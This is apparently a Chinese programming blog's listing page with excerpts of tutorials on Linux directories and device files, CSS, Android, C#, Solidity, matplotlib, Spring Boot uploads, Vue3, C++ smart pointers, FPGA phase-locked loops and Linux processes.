/dev/hd[a-t]：IDE设备 /dev/sd[a-z]：SCSI设备 /dev/fd[0-7]：标准软驱 /dev/md[0-31]：软raid设备 /dev/loop[0-7]：本地回环设备 /dev/ram[0-15]：内存 /dev/null：无限数据接收设备,相当于黑洞 /dev/zero：无限零资源 /dev/tty[0-63]：虚拟终端 /dev/ttyS[0-3]：串口 /dev/lp[0-3]：并口 /dev/console：控制台 /dev/fb[0-31]：framebuffer /dev/cdrom =&gt; /dev/hdc /dev/modem =&gt; /dev/ttyS[0-9] /dev/pilot =&gt; /dev/ttyS[0-9] /dev/random：随机数设备 /dev/urandom：随机数设备 (PS：随机数设备,后面总结一下) /dev目录下的节点是怎么创建的? devf或者udev会自动帮你创建得。 kobject是sysfs文件系统的基础，udev通过监测、检测sysfs来获取新创建的设备的。 Linux系统各个目录的作用 /
这就是根目录。对你的电脑来说，有且只有一个根目录。所有的东西，我是说所有的东西都是从这里开始。举个例子：当你在终端里输入“/home”，你其实是在告诉电脑，先从/（根目录）开始，再进入到home目录。
/root
这是系统管理员（root user）的目录。对于系统来说，系统管理员就好比是上帝，它能对系统做任何事情，甚至包括删除你的文件。因此，请小心使用root帐号。
/bin
这里存放了标准的（或者说是缺省的）linux的工具，比如像“ls”、“vi”还有“more”等等。通常来说，这个目录已经包含在你的“path”系统变量里面了。什么意思呢？就是：当你在终端里输入ls，系统就会去/bin目录下面查找是不是有ls这个程序。
/etc
这里主要存放了系统配置方面的文件。举个例子：你安装了samba这个套件，当你想要修改samba配置文件的时候，你会发现它们（配置文件）就在/etc/samba目录下。
/dev
这里主要存放与设备（包括外设）有关的文件（unix和linux系统均把设备当成文件）。想连线打印机吗？系统就是从这个目录开始工作的。另外还有一些包括磁盘驱动、USB驱动等都放在这个目录。
/home
这里主要存放你的个人数据。具体每个用户的设置文件，用户的桌面文件夹，还有用户的数据都放在这里。每个用户都有自己的用户目录，位置为：/home/用户名。当然，root用户除外。
/tmp
这是临时目录。对于某些程序来说，有些文件被用了一次两次之后，就不会再被用到，像这样的文件就放在这里。有些linux系统会定期自动对这个目录进行清理，因此，千万不要把重要的数据放在这里。
/usr
在这个目录下，你可以找到那些不适合放在/bin或/etc目录下的额外的工具。比如像游戏阿，一些打印工具拉等等。/usr目录包含了许多子目录：/usr/bin目录用于存放程序；/usr/share用于存放一些共享的数据，比如音乐文件或者图标等等；/usr/lib目录用于存放那些不能直接运行的，但却是许多程序运行所必需的一些函数库文件。你的软件包管理器（应该是“新立得”吧）会自动帮你管理好/usr目录的。
/opt
这里主要存放那些可选的程序。你想尝试最新的firefox测试版吗？那就装到/opt目录下吧，这样，当你尝试完，想删掉firefox的时候，你就可以直接删除它，而不影响系统其他任何设置。安装到/opt目录下的程序，它所有的数据、库文件等等都是放在同个目录下面。
举个例子：刚才装的测试版firefox，就可以装到/opt/firefox_beta目录下，/opt/firefox_beta目录下面就包含了运行firefox所需要的所有文件、库、数据等等。要删除firefox的时候，你只需删除/opt/firefox_beta目录即可，非常简单。
/usr/local
这里主要存放那些手动安装的软件，即不是通过“新立得”或apt-get安装的软件。它和/usr目录具有相类似的目录结构。让软件包管理器来管理/usr目录，而把自定义的脚本（scripts）放到/usr/local目录下面，我想这应该是个不错的主意。
/media
有些linux的发行版使用这个目录来挂载那些usb接口的移动硬盘（包括U盘）、CD/DVD驱动器等等。
Linux中/proc目录下文件详解（一） /proc文件系统下的多种文件提供的系统信息不是针对某个特定进程的，而是能够在整个系统范围的上下文中使用。可以使用的文件随系统配置的变化而变化。命令procinfo能够显示基于其中某些文件的多种系统信息。以下详细描述/proc下的文件。
/proc/cmdline文件
这个文件给出了内核启动的命令行。它和用于进程的cmdline项非常相似。
示例： [root@localhost proc]# cat cmdline ro root=LABEL=/ rhgb quiet /proc/cpuinfo文件
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87c1c56f22392573dfc93009034a3b4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/777d7d444e09f93d9316d5ca92c5216b/" rel="bookmark">
			CSS鼠标悬浮变小手
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们在网页设计中需要用户点击或者选择某个元素时，很多时候会使用鼠标悬浮变小手的效果，这种效果可以让用户更快速的完成操作，提高用户体验。
在CSS中设置鼠标悬浮变小手效果非常简单，只需要使用cursor属性即可。以下是具体步骤：
找到需要设置鼠标悬浮变小手效果的元素，通常是链接、按钮等元素。
在该元素的CSS样式中，添加cursor: pointer;属性。
例如：
a { cursor: pointer; } 上述代码表示当鼠标悬浮在链接上时，鼠标指针会变成小手。
除了pointer之外，还有其他一些常见的鼠标指针样式，例如：
default: 默认指针样式（箭头）text: 文本选择指针样式（I型）move: 移动指针样式（四向箭头）not-allowed: 禁止指针样式（圆圈加斜杠） 您可以根据具体需求来使用不同的鼠标指针样式。
总之，在网页设计中使用鼠标悬浮变小手效果可以提高用户体验，让用户更快速的完成操作
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8425c5a1851e9f3ed6659edd7345ce54/" rel="bookmark">
			Android EditText 实现强制性弹出只能输入英文的键盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果 EditText 控件不做任何特殊处理，例如笔者手机默认弹出的是百度输入法的软键盘，可实现中英文切换，并且自带英文单词智能联想功能（与系统安装输入法和设置相关）。但在某些应用场景下，例如在英语APP里练习英文句子听写，需要实现：
默认弹出只能输入英文的键盘，不允许切换到中文输入键盘，屏蔽输入法的智能联想功能。
下面直接给出答案：
方式1：EditText 属性：
android:inputType="textVisiblePassword | textMultiLine" 方式2：代码实现
setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD | InputType.TYPE_TEXT_FLAG_MULTI_LINE); 解释：
因为 EditText 的属性设置里并没有一个专门设置只能弹出英文键盘的功能 。（注意区分：android:digits="abcd...xyz 123456789" 这个只能实现输入内容的过滤）
textVisiblePassword 或 InputType.TYPE_TEXT_VARIATION_NORMAL 的字面意思是“输入密码可见”的意思，虽然与“只限英文输入”的需求实现并不对应，但是却“歪打正着”地实现了我们的需求，但是如果只添加此属性，却又无法输入多行文本（按回车键也不行），所以还需添加属性 textMultiLine 或 InputType.TYPE_TEXT_FLAG_MULTI_LINE。
笔者使用的是华为手机，所以采用上面的方式弹出的是一个只能输入英文的华为安全键盘。
疑问：
那为什么第二个方法还需要添加一个 InputType.TYPE_CLASS_TEXT 呢？比第一个方法多设置了一个属性。经过笔者测试，如果不添加该属性，如下：
setInputType(InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD | InputType.TYPE_TEXT_FLAG_MULTI_LINE); 虽然从效果上看，确实能实现只弹出英文键盘的目的，但还是无法输入多行文本，尽管我们特地还添加了一个“TYPE_TEXT_FLAG_MULTI_LINE”属性。后面查看相关属性值的文档就明白了，在EditText 的 XML布局文件里点击 InputType 的对应的链接，进入到 attrs.xml 文件，找到 textVisiblePassword：
&lt;!-- Text that is a password that should be visible. Corresponds to {@link android.text.InputType#TYPE_CLASS_TEXT} | {@link android.text.InputType#TYPE_TEXT_VARIATION_VISIBLE_PASSWORD}. --&gt; &lt;flag name="textVisiblePassword" value="0x00000091" /&gt; 看到了吗？textVisiblePassword 的值为 0x00000091，而且写的非常清楚的，它是：TYPE_CLASS_TEXT 与 TYPE_TEXT_VARIATION_VISIBLE_PASSWORD 两者二进制“或运算”的结果。两个属性值得二进制值分别为：0x00000001 和 0x00000090，两者的或运算就等于0x00000091。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8425c5a1851e9f3ed6659edd7345ce54/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/327bc016123c72cce36654de715e89d9/" rel="bookmark">
			C#学习记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		带数组的结构和数组映射如下
[StructLayout(LayoutKind.Explicit, Size = 24)] public unsafe struct TestData { [FieldOffset(0)] public ushort Data1; [FieldOffset(2)] public ushort Data2; [FieldOffset(4)] public uint Data3; [FieldOffset(8)] public fixed byte Data5[16]; } //或使用以下方法直接和C语言Data5[1]一样访问 [StructLayout(LayoutKind.Explicit, Size = 24)] public unsafe class TestData { [FieldOffset(0)] public ushort Data1; [FieldOffset(2)] public ushort Data2; [FieldOffset(4)] public uint Data3; [FieldOffset(8)] private byte _data5; public byte* Data5 { get { fixed(byte* p = &amp;_data5) { return p; } } } } 数组和类转换，字节对齐，位域和共用体
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/327bc016123c72cce36654de715e89d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f41559b140441b9b05b1b332547f162b/" rel="bookmark">
			Solidity之变量数据存储和作用域
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引用类型 引用类型(Reference Type)：包括数组（array），结构体（struct）和映射（mapping），这类变量占空间大，赋值时候直接传递地址（类似指针）。由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。
数据位置 solidity数据存储位置有三类：storage，memory和calldata。不同存储位置的gas成本不同。storage类型的数据存在链上，类似计算机的硬盘，消耗gas多；memory和calldata类型的临时存在内存里，消耗gas少。
storage：合约里的状态变量默认都是storage，存储在链上。memory：函数里的参数和临时变量一般用memory，存储在内存中，不上链。calldata：和memory类似，存储在内存中，不上链。与memory的不同点在于calldata变量不能修改（immutable），一般用于函数的参数。例子：
赋值规则 在不同存储类型相互赋值时候，有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）。规则如下：
storage（合约的状态变量）赋值给本地storage（函数里的）时候，会创建引用，改变新变量会影响原变量。例子： uint[] x= [1,2,3]; function Fstorng() public{ //声明一个storage的变量，指向x。修改变量也会影响x uint[] storage S=x; S[0] =99 ; } storage赋值给memory，会创建独立的副本，修改其中一个不会影响另一个；反之也是一样的。 uint[] x=[1,2,3];//状态变量 类型为数组 function fMemory() public view{ //声明一个Memory的变量，复制x。修改变量不会影响x uint[] memory xMemory = x; xMemory[0] = 100; xMemory[1] = 200; uint[] memory xMemory2 = x; xMemory2[0] = 300; } memory赋值给memory，会创建引用，改变新变量会影响原变量。其他情况，变量赋值给storage，会创建独立的副本，修改其中一个不会影响另一个。 变量的作用域 Solidity中变量按作用域划分有三种，分别是状态变量（state variable），局部变量（local variable）和全局变量(global variable)
1. 状态变量 状态变量是数据存储在链上的变量，所有合约内函数都可以访问 ，gas消耗高。状态变量在合约内、函数外声明：
contract HelloWeb3{ uint public a=1; string public _str= "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f41559b140441b9b05b1b332547f162b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/996245d8a342af9c4cda35ba915d81c7/" rel="bookmark">
			plt.imshow()的用法和参数介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 函数说明 plt.imshow()是Matplotlib中的一个函数，用于显示图像。它可以传递一个二维或三维数组作为image参数， 并将图像数据显示为图形，并对图像进行不同的可视化设置。
关于二维/三维数组的解释说明 image支持的数组形状包括：
(M, N)：具有标量数据的图像。使用归一化和颜色映射将值映射到颜色。(M, N, 3)：具有RGB值（0-1浮点数或0-255整数）的图像。(M, N, 4)：具有RGBA值（0-1浮点数或0-255整数）的图像，即包括透明度。前两个维度(M, N)定义了图像的行和列。超出范围的RGB(A)值将被裁剪。 #二维数组(M, N) np.random.rand(2,2) #三维数组(M, N, 3) np.random.rand(2,2,3) #三维数组(M, N, 4) np.random.rand(2,2,4) 第一行代码创建了一个形状为(2, 2)的二维数组。它将包含2行2列的随机值，类似于一个2x2的二维表格。
第二行代码创建了一个形状为(2, 2, 3)的三维数组。这个数组类似于由2个2x3的二维数组构成的集合，它包含2个2x3的二维数组，并且每个元素都是一个长度为3的一维数组。
第三行代码创建了一个形状为(2, 2, 4)的三维数组。这个数组类似于由2个2x4的二维数组构成的集合，它包含2个2x4的二维数组，并且每个元素都是一个长度为4的一维数组。
常用参数介绍 camp：颜色设置。常用的值有’viridis’、‘gray’、'hot’等。可以通过plt.colormaps()查看可用的颜色映射。
aspect：调整坐标轴。这将根据图像数据自动调整坐标轴的比例。常用的值有’auto’、'equal’等。设置为’auto’时会根据图像数据自动调整纵横比，而设置为’equal’时则会强制保持纵横比相等。
interpolation：插值方法。它定义了图像在放大或缩小时的插值方式。常用的值有’nearest’、‘bilinear’、'bicubic’等。较高的插值方法可以使图像看起来更平滑，但计算成本更高。
alpha：透明度。它允许您设置图像的透明度，取值范围为0（完全透明）到1（完全不透明）之间。
vmin和vmax：用于设置显示的数据值范围。当指定了这两个参数时，imshow()将会根据给定的范围显示图像，超出范围的值会被截断显示。
官网文件地址：https://matplotlib.org/stable/api/_as_gen/matplotlib.pyplot.imshow.html
函数示例 import numpy as np import matplotlib.pyplot as plt # 创建一个简单的二维数组作为图像数据 image = np.random.rand(4, 4) # 显示图像 plt.imshow(image, cmap='viridis', interpolation='nearest', aspect='auto') plt.colorbar() # 显示颜色条 plt.title('Random Image') # 设置标题 plt.show() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2f5b7fd82dce8026f1a2b19b454542f/" rel="bookmark">
			DOTween教程☀️DOTween的使用教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 📢 DOTween官网🟥 DOTween使用技巧1️⃣ DoKill的使用技巧2️⃣ 忽略timeScale的影响3️⃣ 动态添加DOTweenAnimation的方法🚩 方法1：代码控制🚩 方法2：添加组件 🟧 DOTween的API介绍1️⃣ DOTween.To2️⃣ DOMove3️⃣ DOMoveX、DOMoveY、DOMoveZ4️⃣ From5️⃣ Pause、DOPlay、DOPlayForward、DOPlayBackwards、DORestart6️⃣ SetEase7️⃣ SetLoops8️⃣ 事件函数9️⃣ DOText 文本动画🔟DOShakePosition 震动效果1️⃣1️⃣ DOColor 改变颜色1️⃣2️⃣ DOFade 改变透明度 🟩 可视化路径编辑1️⃣ DoTweenPath面板属性的含义2️⃣ 代码控制DoTweenPath的方法 📢 DOTween官网 DOTween官网： 传送门
🟥 DOTween使用技巧 1️⃣ DoKill的使用技巧 当前dotween动画没播放完，便再次播放有冲突的操作，如连续多次播放、正播、倒播，导致显示不正常或报错。
解决方法：在每次开始执行播放动画时，先加上下面对应类似的杀死进程代码，就OK了
transform.DOKill(); transform.RectTransform().DOKill(); 2️⃣ 忽略timeScale的影响 让DOTweenAnimation忽略Time.timeScale = 0的影响
GetComponent&lt;DOTweenAnimation&gt;().tween.SetUpdate(true); 3️⃣ 动态添加DOTweenAnimation的方法 🚩 方法1：代码控制 transform.DOLocalRotate(new Vector3(0, 0, -360), 2, RotateMode.FastBeyond360) .SetEase(Ease.Linear).SetLoops(-1, LoopType.Restart).Play(); 🚩 方法2：添加组件 在实际测试，发现有时莫名失效。建议采用预制体形式。
using DG.Tweening; using DG.Tweening.Core; DOTweenAnimation da= ob.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2f5b7fd82dce8026f1a2b19b454542f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c42d258c3ce4c0005b953eb445bad477/" rel="bookmark">
			Win11安装网络打印机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://support.microsoft.com/zh-cn/windows/%E5%9C%A8-windows-%E4%B8%AD%E5%AE%89%E8%A3%85%E6%89%93%E5%8D%B0%E6%9C%BA-cc0724cf-793e-3542-d1ff-727e4978638b
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/462180f48d12d5c3070015555ed535f8/" rel="bookmark">
			一个Demo搞定前后端大文件分片上传、断点续传、秒传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1前言 文件上传在项目开发中再常见不过了，大多项目都会涉及到图片、音频、视频、文件的上传，通常简单的一个Form表单就可以上传小文件了，但是遇到大文件时比如1GB以上，或者用户网络比较慢时，简单的文件上传就不能适用了，用户辛苦传了好几十分钟，到最后发现上传失败，这样的系统用户体验是非常差的。
或者用户上传到一半时，把应用退出了，下次进来再次上传，如果让他从头开始传也是不合理的。本文主要通过一个Demo从前端、后端用实战代码演示小文件上传、大文件分片上传、断点续传、秒传的开发原理。
2小文件上传 小文件小传非常的简单，本项目后端我们使用SrpingBoot 3.1.2 + JDK17，前端我们使用原生的JavaScript+spark-md5.min.js实现。
后端代码 POM.xml使用springboot3.1.2JAVA版本使用JDK17
&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;3.1.2&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;uploadDemo&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;uploadDemo&lt;/name&gt; &lt;description&gt;uploadDemo&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;17&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; JAVA接文件接口：
@RestController public class UploadController { public static final String UPLOAD_PATH = "D:\\upload\\"; @RequestMapping("/upload") public ResponseEntity&lt;Map&lt;String, String&gt;&gt; upload(@RequestParam MultipartFile file) throws IOException { File dstFile = new File(UPLOAD_PATH, String.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/462180f48d12d5c3070015555ed535f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9d00b7bf14b726cbf18dcfe9fb11ce6/" rel="bookmark">
			解决vue3父组件执行子组件方法报错：TypeError: Cannot read properties of null
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现象：
父组件执行子组件的代码：
原因： Vue3使用的所有变量除了来自父组件传值的props以外，其他的html绑定的所有本地变量都必须通过return导出！
这一点是vue3 最坑爹的一点。很容易忘记。
解决办法：使用toRefs解构state属性，并通过return导出
return {
...toRefs(state) // 这句是关键，否则会报错Uncaught TypeError: Cannot read properties of null
}
但是这没完！
如果你通过.value获取ref对象，此时还是会报错：TypeError: Cannot read properties of null
为什么因为：通过toRefs解构出来的对象，不再需要.value获取值了！
toRefs 会将 ref 对象中的 .value 自动解构出来，因此你无需再使用 .value 来获取值。一旦使用 toRefs 解构，你可以直接访问属性的值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddb24ceb0d4fcbea0724a3ce39fd8b84/" rel="bookmark">
			如何自己实现c&#43;&#43;的智能指针？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自己实现 C++ 的智能指针可以通过封装一个类来实现，代码：
```cpp
template&lt;typename T&gt;
class SmartPointer {
public:
SmartPointer(T* ptr) : m_ptr(ptr), m_refCount(new int(1)) {}
~SmartPointer() {
release();
}
SmartPointer(const SmartPointer&lt;T&gt;&amp; other) : m_ptr(other.m_ptr), m_refCount(other.m_refCount) {
(*m_refCount)++;
}
SmartPointer&lt;T&gt;&amp; operator=(const SmartPointer&lt;T&gt;&amp; other) {
if (this != &amp;other) {
release();
m_ptr = other.m_ptr;
m_refCount = other.m_refCount;
(*m_refCount)++;
}
return *this;
}
T* operator-&gt;() const {
return m_ptr;
}
T&amp; operator*() const {
return *m_ptr;
}
private:
void release() {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddb24ceb0d4fcbea0724a3ce39fd8b84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92f7ebcb4b346ccfd7aff8501c51bd1a/" rel="bookmark">
			数字锁相环的原理与FPGA实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数字锁相环的原理与FPGA实现 前言一、数字锁相环原理1.1 数字鉴相器1.2 环路滤波器1.3 压控振荡器1.4 二阶数字锁相环参数计算 二、数字锁相环的FPGA实现2.1 鉴相器实现2.2 环路滤波器实现2.3 压控振荡器实现2.4 仿真结果 总结参考书 前言 数字锁相环是锁相环电路的全数字实现。锁相环电路能够实现对输入信号的相位进行跟踪，进而在噪声中提取纯净的有用信号。
一、数字锁相环原理 输入信号 鉴相器 环路滤波器 压控振荡器 1.1 数字鉴相器 数字鉴相器由乘法器和低通滤波器构成，又称为正弦形式的鉴相器。数字鉴相器有一重要指标——鉴相增益 K d K_d Kd​，又可表示为鉴相器输出的最大电压。
1.2 环路滤波器 环路滤波器将鉴相器输出的含有纹波的信号平均化，将其转换为交流信号少的直流信号的低通滤波器。除此之外，还能控制环路特性，提供环路增益。
1.3 压控振荡器 压控振荡器的原理是，通过输入控制信号的大小，来控制其输出信号的频率变化。
1.4 二阶数字锁相环参数计算 锁相环环路传输模型：
具体推导请参杜勇老师的锁相环技术原理及FPGA实现和数字调制解调技术的Matlab与FPGA实现两本书，这里给出书中最终结果的计算公式。
以理想二阶环（有源比例积分滤波器）为例，计算环路滤波器的参数C1和C2，最后可取近似得二进制数 2 − N 2^{-N} 2−N，采取对环路滤波器输入数据向右移动N位近似使用。
C 1 = 2 τ 2 + T 2 τ 1 , C 2 = T τ 1 C_1 = \dfrac{2\tau_2 + T}{2\tau_1}, C_2 = \dfrac{T}{\tau_1} C1​=2τ1​2τ2​+T​,C2​=τ1​T​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92f7ebcb4b346ccfd7aff8501c51bd1a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/671b2be3c20f6627025f1c06bcb6d439/" rel="bookmark">
			Unable to close ApplicationContext
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 今天做项目遇到了这个问题 。
像这类问题，属于版本不兼容。
这是创建SpringBoot项目时自动配置的
&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;/dependency&gt; 由于版本更新的问题，一般新版本都有问题。
换成以下版本，问题就解决了
&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;!-- 2.2.2 版本也行，但2.1.0更稳定 --&gt; &lt;version&gt;2.1.0&lt;/version&gt; &lt;/dependency&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71751a39c189a735b0094ad1fede6fc3/" rel="bookmark">
			Python---字符串中的查找方法--index()--括号里是要获取的字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		index()方法其功能与find()方法完全一致，唯一的区别在于当要查找的子串没有出现在字符串中时，find()方法返回-1，而index()方法则直接 报错。
find()方法相关链接：Python---字符串中的查找方法--find（）--括号里是要获取的字符串-CSDN博客
index() 方法： 检测 某个子串 是否包含在这个字符串中，如果在 返回这个子串 开始的位置 下标，否则 报异常。 案例：
str1 = 'apple, banana, orange' # 判断apple是否出现在字符串str1中 print(str1.index('apple')) print(str1.index('pineapple')) 图示：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c0fc28e82862fba669f46313037082e/" rel="bookmark">
			Linux---进程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@toc
操作系统 传统的计算机系统资源分为硬件资源和软件资源。硬件资源包括中央处理器，存储器，输入设备，输出设备等物理设备；软件资源是以文件形式保存在存储器上的成熟和数据等信息。
操作系统就是计算机系统资源的管理者。
如果你的计算机没有安装操作系统，那么你将面对的是0，1代码和一些难懂的机器指令，通过按钮或者按键来操作计算机，这样笨拙+费时。安装操作系统之后，你面对的就不再是笨拙的裸机，而是操作便利，服务周到的操作系统，从而明显的改善了用户界面。
操作系统为了保证自己的安全，也为了保证给用户能够提供服务，就以接口的方式给用户提供调用的入口，来获取操作系统内部的数据。
这个接口是操作系统提供的用C语言实现的，自己内部的函数调用---系统调用
所有访问操作系统的行为，都只能通过系统调用完成，因为操作系统不会让你随意的去对自己进行更改。
所以，操作系统就是一个管理者，利用操作系统能够有效的组织和管理系统中的各种软硬件资源，合理的组织计算机系统工作的流程，控制程序的执行，并且向用户提供一个良好的工作环境和友好的接口。（程序猿通过暴露出的接口，开发出来各种软件供普通用户使用）。
那么操作系统是如何管理的呢？ 在学校中，我们就是最典型的被管理者，校长是管理者。管理者与被管理者是不需要见面的，查考勤情况的活肯定不是校长监督的吧。那么校长连A同学都不知道是谁，怎么管理好这么多同学呢？
其实只要校长拿到了学生的数据，就能进行管理，见不见面不是必须的，就算见面了，也是为了获取某同学的数据。管理的本质：是通过对数据的管理达到对人的管理。
但是不见面的情况下，校长是怎么知道A同学挂没挂科呢？这些数据都可以通过辅导员来拿到数据。
在这里，校长相当于操作系统，辅导员相当于驱动程序，学生相当于软硬件资源。所以操作系统要管理好软硬件资源是通过获取硬件的各种状态数据来进行管理，这个数据从驱动程序中获得。一个硬件不能用了，驱动程序把信息传递给操作系统，操作系统告知用户。
学校中的学生很多，他弄了一个excel表格，让辅导员按照这个表格获取学生的信息，辅导员获取完信息后，在把表格给校长，现在校长要找谁个子最高等信息，只需要遍历一遍表格即可。这个过程就是一个描述的过程。
但校长曾经是一个程序猿，他弄了一个结构体来实现这个表格。
struct student { char 学院[]; char 专业[]; ...... struct student *next; } struct student stu1 = {}; 每一个结构体对象里面存着学生的信息，通过next来对学生进行链接。
所以校长只要把这个学生链表管理好就行了。这样就将对学生的管理工作变成了对链表的增删查改。想找挂科超过3科的，直接遍历链表即可。填写学生信息的过程是描述过程，把学生通过节点链接起来的过程是组织的过程。
操作系统中，管理任何对象，最终就变成了对某种的数据结构的管理。操作系统管理的过程跟上面的例子一样：先描述在组织。
之前写通讯录之类管理系统，先把要存的信息写在结构体中，然后对这个结构体进行封装，这不就是先描述，在组织吗？
struct person { char name; int age; char telphone1; char telphone2; ... } struct contact { struct person[100]; int num; ... } 系统调用和库函数概念 操作系统不相信任何人，只会提供系统调用接口，如果你想简介的访问硬件或者打开文件之类的操作，是不能直接访问底层硬件，而是层层访问，以贯穿的形式。比如说printf函数，他是C标准函数，他的底层绝对要封装系统调用接口，所以C/C++封装的库函数，和系统调用接口的关系，是上下层被调用的关系，而不是直接绕过系统调用接口直接访问的。
那么谁在上，谁在下呢？
库函数在上，系统调用接口在下，
在开发的角度，操作系统对外表现为一个整体，但是会暴露一部分接口，供程序猿开发使用，这部分由操作系统提供的接口，叫做系统调用 系统调用在使用上， 功能比较基础，对用户的要求也相对较高，所以，有些开发者可以对部分系统调用进行适度封装，从而形成了库，有了库，就很利于上层用户或者开发者进行二次开发 进程 一个已经加载到内存中的程序，叫做进程。
这些已经打开的软件，都是进程，对上面的某一个进程，右键结束任务，就杀死了某个进程。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c0fc28e82862fba669f46313037082e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb1842ac6f71ef53db27588c84c28951/" rel="bookmark">
			正点原子嵌入式linux驱动开发——Linux 网络设备驱动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络驱动是linux里面驱动三巨头之一，linux下的网络功能非常强大，嵌入式linux中也常常用到网络功能。前面已经讲过了字符设备驱动和块设备驱动，本章就来学习一下linux里面的网络设备驱动。
嵌入式网络简介 嵌入式下的网络硬件接口 本次笔记中讨论的都是有线网络！
提起网络，一般想到的硬件就是“网卡”。在电脑领域的“原始社会”，网卡是独立的硬件，如果电脑要上网就得买个网卡插上去，类似现在的显卡一样。但是现在随着技术的不断发展，只需要一个芯片就可以实现有线网卡功能，因此网卡芯片都直接放到了主板上。
首先，嵌入式网络硬件分为两部分：MAC和PHY，都是通过看数据手册来判断一款SoC是否支持网络，如果一款芯片数据手册说自己支持网络，一般都是说的这款SoC内置MAC，MAC类似I2C控制器、SPI控制器一样的外设。但是光有MAC还不能直接驱动网络，还需要另外一个芯片：PHY，因此对于内置MAC的SoC，其外部必须搭配一个PHY芯片。但是有些SoC内部没有MAC，那也没法搭配PHY芯片了，这些内部没有MAC的芯片上网就要采用另外的嵌入式网络硬件方案。
